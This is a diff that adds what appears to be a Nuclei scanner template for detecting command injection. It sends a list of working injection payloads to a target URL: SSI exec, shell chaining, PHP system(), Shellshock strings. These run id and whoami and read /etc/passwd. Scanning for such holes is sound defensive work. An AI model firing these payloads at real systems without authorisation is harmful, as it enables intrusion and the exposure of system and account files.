@@ -1,0 +1,42 @@
+id: cmd
+
+info:
+  name: Command Injection Detection
+  author: pikpikcu
+  severity: high
+  description: |
+    This template detects command injection vulnerabilities by sending payloads that attempt to execute system commands and observe their responses.
+  remediation: |
+    Sanitize user input to prevent command execution. Use parameterized queries or frameworks that safely handle shell commands.
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}<!--#exec%20cmd=\"/bin/cat%20/etc/passwd\"-->"
+      - "{{BaseURL}}<!--#exec%20cmd=\"/usr/bin/id;\"-->"
+      - "{{BaseURL}};cat+/etc/passwd"
+      - "{{BaseURL}};id;"
+      - "{{BaseURL}};netstat -a;"
+      - "{{BaseURL}};system('cat%20/etc/passwd')"
+      - "{{BaseURL}}%0Acat%20/etc/passwd"
+      - "{{BaseURL}}%0A/usr/bin/id"
+      - "{{BaseURL}}%0Aid"
+      - "{{BaseURL}}`id`"
+      - "{{BaseURL}};cat+/etc/hosts"
+      - "{{BaseURL}}cat%20/etc/hosts"
+      - "{{BaseURL}};cat%20/etc/hosts"
+      - "{{BaseURL}}<?php%20system('cat%20/etc/passwd');?>"
+      - "{{BaseURL}}eval('whoami')"
+      - "{{BaseURL}}|%20pwd"
+      - "{{BaseURL}}() { :;}; echo www-data"
+      - "{{BaseURL}}() { :;};whoami"
+      - "{{BaseURL}}(){ :;};+id"
+      - "{{BaseURL}}(++){:%:};cat+/etc/passwd"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "www-data"
+          - "localhost"
+        part: body
